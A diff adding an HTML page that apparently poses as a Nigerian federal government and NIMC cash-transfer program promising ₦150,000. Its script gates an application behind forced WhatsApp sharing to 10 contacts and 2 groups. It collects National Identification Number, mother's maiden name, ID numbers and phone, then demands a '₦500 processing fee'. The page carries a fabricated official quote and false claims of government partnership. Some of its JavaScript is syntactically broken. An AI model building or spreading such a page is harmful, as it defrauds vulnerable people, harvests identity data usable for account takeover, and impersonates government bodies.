@@ -1,0 +1,809 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mass Adoption Identity Resource - Federal Government CCT Program</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+        
+        body {
+            background-color: #f5f5f5;
+            color: #333;
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #fff;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 5px;
+            margin-top: 30px;
+            margin-bottom: 30px;
+        }
+        
+        header {
+            background-color: #003366;
+            color: white;
+            padding: 20px;
+            text-align: center;
+            border-radius: 5px 5px 0 0;
+            margin-bottom: 20px;
+            position: relative;
+        }
+        
+        .agency-name {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            letter-spacing: 1px;
+        }
+        
+        .government-branding {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 15px 0;
+        }
+        
+        .coat-of-arms {
+            height: 70px;
+            margin-right: 15px;
+        }
+        
+        .flag {
+            height: 45px;
+            border: 1px solid #ddd;
+        }
+        
+        .government-title {
+            font-size: 16px;
+            font-weight: bold;
+            margin: 0 15px;
+        }
+        
+        h1 {
+            font-size: 24px;
+            margin: 10px 0;
+            letter-spacing: 0.5px;
+        }
+        
+        .highlight {
+            background-color: #ffcc00;
+            color: #003366;
+            padding: 12px;
+            text-align: center;
+            font-weight: bold;
+            margin-bottom: 25px;
+            border-radius: 5px;
+            font-size: 18px;
+            line-height: 1.4;
+        }
+        
+        .highlight span {
+            font-size: 1.3em;
+            font-weight: bolder;
+            text-shadow: 1px 1px 1px rgba(0,0,0,0.1);
+        }
+        
+        .content {
+            padding: 0 20px 20px;
+        }
+        
+        p {
+            margin-bottom: 15px;
+            text-align: justify;
+        }
+        
+        .news {
+            background-color: #f0f8ff;
+            padding: 18px;
+            border-left: 4px solid #003366;
+            margin: 25px 0;
+            border-radius: 0 5px 5px 0;
+        }
+        
+        .news h2 {
+            color: #003366;
+            margin-bottom: 12px;
+            font-size: 20px;
+        }
+        
+        .news p {
+            margin-bottom: 12px;
+        }
+        
+        .news-source {
+            font-style: italic;
+            color: #666;
+            margin-top: 15px;
+            font-size: 14px;
+        }
+        
+        .news-image {
+            width: 100%;
+            max-width: 500px;
+            margin: 15px auto;
+            display: block;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+        }
+        
+        .hashtags {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin: 20px 0;
+            justify-content: center;
+        }
+        
+        .hashtag {
+            background-color: #e1e1e1;
+            color: #333;
+            padding: 6px 12px;
+            border-radius: 15px;
+            font-size: 12px;
+            font-weight: bold;
+        }
+        
+        .form-btn {
+            display: block;
+            width: 100%;
+            background-color: #003366;
+            color: white;
+            text-align: center;
+            padding: 16px;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 25px 0;
+            transition: background-color 0.3s;
+            letter-spacing: 0.5px;
+        }
+        
+        .form-btn:hover {
+            background-color: #002244;
+        }
+        
+        footer {
+            text-align: center;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #eee;
+            color: #666;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        
+        /* Share verification modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .modal-content {
+            background-color: white;
+            padding: 30px;
+            border-radius: 10px;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+        }
+        
+        .modal h2 {
+            color: #003366;
+            margin-bottom: 20px;
+            font-size: 22px;
+        }
+        
+        .share-step {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+            padding: 12px;
+            background-color: #f5f5f5;
+            border-radius: 5px;
+            font-size: 15px;
+        }
+        
+        .share-step.completed {
+            background-color: #e6f7e6;
+        }
+        
+        .share-step input {
+            margin-right: 12px;
+            transform: scale(1.2);
+        }
+        
+        .share-btn {
+            background-color: #25D366;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-top: 15px;
+            display: inline-flex;
+            align-items: center;
+            font-size: 16px;
+            transition: background-color 0.3s;
+        }
+        
+        .share-btn:hover {
+            background-color: #128C7E;
+        }
+        
+        .share-btn i {
+            margin-right: 10px;
+            font-size: 18px;
+        }
+        
+        /* Application form styles */
+        #applicationForm {
+            display: none;
+            margin-top: 30px;
+            padding: 25px;
+            background-color: #f9f9f9;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+        }
+        
+        #applicationForm h2 {
+            color: #003366;
+            margin-bottom: 25px;
+            text-align: center;
+            font-size: 22px;
+        }
+        
+        .form-group {
+            margin-bottom: 18px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 6px;
+            font-weight: bold;
+            font-size: 15px;
+        }
+        
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 15px;
+        }
+        
+        .submit-btn {
+            background-color: #003366;
+            color: white;
+            border: none;
+            padding: 14px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            width: 100%;
+            margin-top: 15px;
+            font-size: 16px;
+            transition: background-color 0.3s;
+        }
+        
+        .submit-btn:hover {
+            background-color: #002244;
+        }
+        
+        .fee-notice {
+            background-color: #fff8e1;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+            border-left: 4px solid #ffc107;
+        }
+        
+        .fee-notice h3 {
+            color: #003366;
+            margin-bottom: 10px;
+        }
+        
+        #paymentPage {
+            display: none;
+            margin-top: 30px;
+            padding: 25px;
+            background-color: #f9f9f9;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+        }
+        
+        #paymentPage h2 {
+            color: #003366;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .payment-options {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin: 20px 0;
+        }
+        
+        .payment-option {
+            display: flex;
+            align-items: center;
+            padding: 15px;
+            background-color: white;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .payment-option:hover {
+            border-color: #003366;
+        }
+        
+        .payment-option input {
+            margin-right: 15px;
+        }
+        
+        .payment-icon {
+            font-size: 24px;
+            margin-right: 15px;
+            color: #003366;
+        }
+        
+        .payment-details {
+            flex-grow: 1;
+        }
+        
+        .payment-amount {
+            font-size: 18px;
+            font-weight: bold;
+            color: #003366;
+        }
+        
+        @media (max-width: 600px) {
+            .container {
+                margin: 10px;
+                padding: 15px;
+            }
+            
+            header {
+                padding: 15px;
+            }
+            
+            .government-branding {
+                flex-direction: column;
+            }
+            
+            .coat-of-arms {
+                margin-right: 0;
+                margin-bottom: 10px;
+            }
+            
+            .government-title {
+                margin: 10px 0;
+            }
+            
+            h1 {
+                font-size: 20px;
+            }
+            
+            .highlight {
+                font-size: 16px;
+                padding: 10px;
+            }
+            
+            .modal-content {
+                padding: 20px;
+            }
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="agency-name">MASS ADOPTION IDENTITY RESOURCE</div>
+            
+            <div class="government-branding">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7a/Coat_of_arms_of_Nigeria.svg/1200px-Coat_of_arms_of_Nigeria.svg.png" alt="Nigerian Coat of Arms" class="coat-of-arms">
+                <div class="government-title">Federal Government of Nigeria</div>
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/79/Flag_of_Nigeria.svg/1200px-Flag_of_Nigeria.svg.png" alt="Nigerian Flag" class="flag">
+            </div>
+            
+            <h1>Conditional Cash Transfer Program</h1>
+        </header>
+        
+        <div class="highlight">
+            Qualified beneficiaries may receive <span>₦150,000</span> through the Federal Government's Conditional Cash Transfer initiative
+        </div>
+        
+        <div class="content">
+            <p>The Mass Adoption Identity Resource, in collaboration with the Federal Government of Nigeria, is proud to facilitate the identification and registration of qualified beneficiaries for the Conditional Cash Transfer program. This initiative aims to provide financial support to vulnerable households across Nigeria.</p>
+            
+            <p>Recent updates on the program's progress:</p>
+            
+            <div class="news">
+                <img src="1747506935516.jpg" alt="FC Confirms 2.3 Million Households Have Benefited" class="news-image">
+                
+                <h2>Federal Government Announces 2.3 Million Households Have Received Cash Transfers</h2>
+                <p>The Federal Government has officially confirmed the successful verification and enrollment of 2.3 million Nigerian households in the Conditional Cash Transfer program. This initiative forms part of the government's comprehensive social safety net strategy to mitigate economic challenges faced by citizens.</p>
+                
+                <p>During a press conference at the National Identity Management Commission (NIMC) headquarters in Abuja, Director General Abisoye Coker-Odusote provided details on the program's implementation:</p>
+                
+                <p>"Our rigorous validation process has identified 2.3 million qualified households nationwide. Payments to these beneficiaries will commence imminently through our secure digital payment infrastructure," stated Coker-Odusote.</p>
+                
+                <p>The Director General emphasized the program's commitment to transparency: "Through our partnership with the Mass Adoption Identity Resource, we've implemented robust verification protocols to ensure funds reach only eligible, living beneficiaries. This precision targeting is fundamental to the program's integrity."</p>
+                
+                <div class="news-source">
+                    Official announcement sourced from: <a href="https://www.facebook.com/100064751497117/posts/pfbid02bRpBHLvbeEnZPvibXi4VmKtzqr6bnvtaC1p3ZhGmR4KaW3eJbNN96qSFtzpwFvMjl/" target="_blank">Federal Government Press Release</a>
+                </div>
+            </div>
+            
+            <div class="hashtags">
+                <span class="hashtag">#NigerianSocialIntervention</span>
+                <span class="hashtag">#FGSupportInitiative</span>
+                <span class="hashtag">#CashTransferProgram</span>
+                <span class="hashtag">#VerifiedBeneficiaries</span>
+            </div>
+            
+            <p>Complete the official requisition form below to determine your eligibility for the Conditional Cash Transfer program. All applications undergo thorough verification through the National Identity Management System.</p>
+            
+            <button class="form-btn" id="applyBtn">BEGIN APPLICATION PROCESS</button>
+            
+            <!-- Application Form (hidden by default) -->
+            <div id="applicationForm">
+                <h2>Official Beneficiary Requisition Form</h2>
+                
+                <div class="fee-notice">
+                    <h3>Important Notice Regarding Processing Fee</h3>
+                    <p>As an independent agency partnered with the Federal Government, we require a nominal ₦500 form processing fee to facilitate and expedite your application. This fee enables us to:</p>
+                    <ul style="margin: 10px 0 10px 20px;">
+                        <li>Fast-track your application through verification channels</li>
+                        <li>Maintain our secure application processing infrastructure</li>
+                        <li>Provide dedicated support throughout the approval process</li>
+                        <li>Ensure your application receives priority attention from relevant government bodies</li>
+                    </ul>
+                    <p>This fee is mandatory for all applicants and will be collected after form submission.</p>
+                </div>
+                
+                <form id="cashTransferForm">
+                    <div class="form-group">
+                        <label for="fullName">Full Legal Name (as registered with NIMC)</label>
+                        <input type="text" id="fullName" required placeholder="Enter your full name as it appears on your National ID">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="dob">Date of Birth</label>
+                        <input type="date" id="dob" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="gender">Gender</label>
+                        <select id="gender" required>
+                            <option value="">Select Gender</option>
+                            <option value="Male">Male</option>
+                            <option value="Female">Female</option>
+                        </select>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="phoneNumber">Registered Mobile Number (Linked to NIN)</label>
+                        <input type="tel" id="phoneNumber" required placeholder="Enter your 11-digit mobile number">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="state">State of Origin</label>
+                        <select id="state" required>
+                            <option value="">Select State of Origin</option>
+                            <option value="Abia">Abia</option>
+                            <option value="Adamawa">Adamawa</option>
+                            <option value="Akwa Ibom">Akwa Ibom</option>
+                            <option value="Anambra">Anambra</option>
+                            <option value="Bauchi">Bauchi</option>
+                            <option value="Bayelsa">Bayelsa</option>
+                            <option value="Benue">Benue</option>
+                            <option value="Borno">Borno</option>
+                            <option value="Cross River">Cross River</option>
+                            <option value="Delta">Delta</option>
+                            <option value="Ebonyi">Ebonyi</option>
+                            <option value="Edo">Edo</option>
+                            <option value="Ekiti">Ekiti</option>
+                            <option value="Enugu">Enugu</option>
+                            <option value="FCT">Federal Capital Territory</option>
+                            <option value="Gombe">Gombe</option>
+                            <option value="Imo">Imo</option>
+                            <option value="Jigawa">Jigawa</option>
+                            <option value="Kaduna">Kaduna</option>
+                            <option value="Kano">Kano</option>
+                            <option value="Katsina">Katsina</option>
+                            <option value="Kebbi">Kebbi</option>
+                            <option value="Kogi">Kogi</option>
+                            <option value="Kwara">Kwara</option>
+                            <option value="Lagos">Lagos</option>
+                            <option value="Nasarawa">Nasarawa</option>
+                            <option value="Niger">Niger</option>
+                            <option value="Ogun">Ogun</option>
+                            <option value="Ondo">Ondo</option>
+                            <option value="Osun">Osun</option>
+                            <option value="Oyo">Oyo</option>
+                            <option value="Plateau">Plateau</option>
+                            <option value="Rivers">Rivers</option>
+                            <option value="Sokoto">Sokoto</option>
+                            <option value="Taraba">Taraba</option>
+                            <option value="Yobe">Yobe</option>
+                            <option value="Zamfara">Zamfara</option>
+                        </select>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="lga">Local Government Area (LGA)</label>
+                        <input type="text" id="lga" required placeholder="Enter your Local Government Area">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="nin">National Identification Number (NIN)</label>
+                        <input type="text" id="nin" required pattern="[0-9]{11}" title="11-digit NIN required" placeholder="Enter your 11-digit NIN">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="motherMaiden">Mother's Maiden Name</label>
+                        <input type="text" id="motherMaiden" required placeholder="Enter your mother's maiden name">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="idType">Government-Issued Identification</label>
+                        <select id="idType" required>
+                            <option value="">Select Identification Type</option>
+                            <option value="NIN">National ID Card</option>
+                            <option value="Voter">Permanent Voter's Card</option>
+                            <option value="Driver">Driver's License</option>
+                            <option value="Passport">International Passport</option>
+                        </select>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="idNumber">Identification Number</label>
+                        <input type="text" id="idNumber" required placeholder="Enter your ID number">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="occupation">Primary Occupation</label>
+                        <input type="text" id="occupation" required placeholder="Enter your primary occupation">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="maritalStatus">Marital Status</label>
+                        <select id="maritalStatus" required>
+                            <option value="">Select Marital Status</option>
+                            <option value="Single">Single</option>
+                            <option value="Married">Married</option>
+                            <option value="Divorced">Divorced</option>
+                            <option value="Widowed">Widowed</option>
+                        </select>
+                    </div>
+                    
+                    <button type="submit" class="submit-btn">SUBMIT REQUISITION FORM</button>
+                </form>
+            </div>
+            
+            <!-- Payment Page (hidden by default) -->
+            <div id="paymentPage">
+                <h2>Form Processing Fee Payment</h2>
+                <p>To complete your application, please pay the mandatory ₦500 form processing fee using one of the payment methods below.</p>
+                
+                <div class="fee-notice">
+                    <h3>About the Processing Fee</h3>
+                    <p>As an independent agency working in partnership with the Federal Government, this nominal fee enables us to:</p>
+                    <ul style="margin: 10px 0 10px 20px;">
+                        <li>Expedite your application processing through official channels</li>
+                        <li>Maintain our verification infrastructure and dedicated support team</li>
+                        <li>Ensure your application receives priority attention from relevant government bodies</li>
+                        <li>Cover administrative costs associated with processing your application</li>
+                    </ul>
+                    <p>This fee is mandatory for all applicants and helps us provide faster service than standard government channels.</p>
+                </div>
+                
+                <div class="payment-options">
+                    <div class="payment-option" onclick="selectPayment('bank')">
+                        <input type="radio" name="paymentMethod" id="bankPayment" value="bank">
+                        <i class="fas fa-university payment-icon"></i>
+                        <div class="payment-details">
+                            <div>Bank Transfer</div>
+                            <div style="font-size: 13px; color: #666;">Transfer directly to our corporate account</div>
+                        </div>
+                        <div class="payment-amount">₦500</div>
+                    </div>
+                    
+                    <div class="payment-option" onclick="selectPayment('card')">
+                        <input type="radio" name="paymentMethod" id="cardPayment" value="card">
+                        <i class="far fa-credit-card payment-icon"></i>
+                        <div class="payment-details">
+                            <div>Debit/Credit Card</div>
+                            <div style="font-size: 13px; color: #666;">Secure online payment</div>
+                        </div>
+                        <div class="payment-amount">₦500</div>
+                    </div>
+                    
+                    <div class="payment-option" onclick="selectPayment('ussd')">
+                        <input type="radio" name="paymentMethod" id="ussdPayment" value="ussd">
+                        <i class="fas fa-mobile-alt payment-icon"></i>
+                        <div class="payment-details">
+                            <div>USSD Payment</div>
+                            <div style="font-size: 13px; color: #666;">Quick payment via mobile banking</div>
+                        </div>
+                        <div class="payment-amount">₦500</div>
+                    </div>
+                </div>
+                
+                <button class="form-btn" id="proceedPaymentBtn" disabled>PROCEED TO PAYMENT</button>
+            </div>
+        </div>
+        
+        <footer>
+            <p>Federal Government Conditional Cash Transfer Program © 2025</p>
+            <p>Mass Adoption Identity Resource - Officially designated verification partner of the Federal Government of Nigeria</p>
+            <p style="margin-top: 10px; font-size: 13px;">This is an official government program. All information provided is protected under the Nigeria Data Protection Regulation.</p>
+        </footer>
+    </div>
+
+    <!-- Share Verification Modal -->
+    <div class="modal" id="shareModal">
+        <div class="modal-content">
+            <h2>Program Awareness Requirement</h2>
+            <p>To complete your application, please help disseminate information about this government initiative by sharing with 10 contacts and 2 WhatsApp groups. This ensures widespread awareness of available social support programs.</p>
+            
+            <div class="share-steps">
+                <div class="share-step" id="friendsStep">
+                    <input type="checkbox" id="shareFriends" disabled>
+                    <label for="shareFriends">Shared with contacts (0/10 completed)</label>
+                </div>
+                
+                <div class="share-step" id="groupsStep">
+                    <input type="checkbox" id="shareGroups" disabled>
+                    <label for="shareGroups">Shared with groups (0/2 completed)</label>
+                </div>
+            </div>
+            
+            <button class="share-btn" id="whatsappShareBtn">
+                <i class="fab fa-whatsapp"></i> Share via WhatsApp
+            </button>
+            
+            <p style="margin-top: 20px; font-size: 14px; color: #666;">
+                After sharing, please return to this page to verify your participation.
+            </p>
+            
+            <button class="form-btn" id="verifySharesBtn" style="margin-top: 15px;">
+                VERIFY MY SHARES
+            </button>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Initialize application
+            initApplication();
+        });
+
+        function initApplication() {
+            // Track shares in localStorage
+            if (!localStorage.getItem('whatsappShares')) {
+                localStorage.setItem('whatsappShares', JSON.stringify({
+                    friends: 0,
+                    groups: 0
+                }));
+            }
+            
+            const shareMessage = `Official Nigerian Government Program\n\nApply for the Conditional Cash Transfer initiative and qualify for up to ₦150,000 in financial support.\n\nThis legitimate Federal Government program provides direct financial assistance to qualified Nigerians. Begin your application here:\n\n${window.location.href}\n\n#NigerianSocialSupport #GovernmentAssistance`;
+            
+            // Set up event listeners
+            document.getElementById('applyBtn').addEventListener('click', function() {
+                document.getElementById('shareModal').style.display = 'flex';
+                updateShareStatus();
+            });
+            
+            document.getElementById('whatsappShareBtn').addEventListener('click', function() {
+                // Universal WhatsApp sharing solution
+                const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                const whatsappUrl = isMobile ? 
+                    `whatsapp://send?text=${encodeURIComponent(shareMessage)}` :
+                    `https://web.whatsapp.com/send?text=${encodeURIComponent(shareMessage)}`;
+                
+                window.open(whatsappUrl, '_blank');
+            });
+            
+            document.getElementById('verifySharesBtn').addEventListener('click', function() {
+                const friendsShared = prompt("How many individual contacts did you share with? (0-10)");
+                const groupsShared = prompt("How many groups did you share with? (0-2)");
+                
+                if (friendsShared !== null && groupsShared !== null) {
+                    const shares = {
+                        friends: Math.min(parseInt(friendsShared) || 0,
+                        groups: Math.min(parseInt(groupsShared) || 0
+                    };
+                    
+                    localStorage.setItem('whatsappShares', JSON.stringify(shares));
+                    updateShareStatus();
+                    checkCompletion();
+                }
+            });
+            
+            document.getElementById('cashTransferForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                document.getElementById('applicationForm').style.display = 'none';
+                document.getElementById('paymentPage').style.display = 'block';
+                window.scrollTo(0, document.getElementById('paymentPage').offsetTop);
+            });
+            
+            document.getElementById('proceedPaymentBtn').addEventListener('click', function() {
+                const selectedMethod = document.querySelector('input[name="paymentMethod"]:checked');
+                if (selectedMethod) {
+                    const method = selectedMethod.value;
+                    alert(`You will now be redirected to complete your ₦500 payment via ${method === 'bank' ? 'Bank Transfer' : method === 'card' ? 'Card Payment' : 'USSD'}.`);
+                    // In a real implementation, this would redirect to payment gateway
+                }
+            });
+        }
+
+        function updateShareStatus() {
+            const shares = JSON.parse(localStorage.getItem('whatsappShares'));
+            
+            const friendsStep = document.getElementById('friendsStep');
+            const groupsStep = document.getElementById('groupsStep');
+            
+            friendsStep.querySelector('label').textContent = `Shared with contacts (${shares.friends}/10 completed)`;
+            groupsStep.querySelector('label').textContent = `Shared with groups (${shares.groups}/2 completed)`;
+            
+            if (shares.friends >= 10) {
+                friendsStep.classList.add('completed');
+                friendsStep.querySelector('input').checked = true;
+            } else {
+                friendsStep.classList.remove('completed');
+                friendsStep.querySelector('input').checked = false;
+            }
+            
+            if (shares.groups >= 2) {
+                groupsStep.classList.add('completed');
+                groupsStep.querySelector('input').checked = true;
+            } else {
+                groupsStep.classList.remove('completed');
+                groupsStep.querySelector('input').checked = false;
+            }
+        }
+        
+        function checkCompletion() {
+            const shares = JSON.parse(localStorage.getItem('whatsappShares'));
+            
+            if (shares.friends >= 10 && shares.groups >= 2) {
+                document.getElementById('shareModal').style.display = 'none';
+                document.getElementById('applicationForm').style.display = 'block';
+                window.scrollTo(0, document.getElementById('applicationForm').offsetTop);
+            }
+        }
+        
+        function selectPayment(method) {
+            document.getElementById('proceedPaymentBtn').disabled = false;
+            document.getElementById(method + 'Payment').checked = true;
+        }
+    </script>
+</body>
+</html>
